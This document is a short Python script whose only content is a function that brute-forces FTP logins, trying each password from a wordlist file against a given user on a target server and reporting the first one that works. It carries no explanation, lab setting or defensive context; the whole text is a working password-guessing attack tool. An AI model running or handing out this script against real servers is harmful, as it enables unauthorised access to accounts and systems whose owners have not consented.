from ftplib import FTP

def brute_force_ftp(target, user, password_list):
    for password in open(password_list):
        password = password.strip()
        try:
            ftp = FTP(target)
            ftp.login(user, password)
            print(f"[SUCCESS] Login: {user}:{password}")
            ftp.quit()
            break
        except:
            print(f"[FAIL] {user}:{password}")
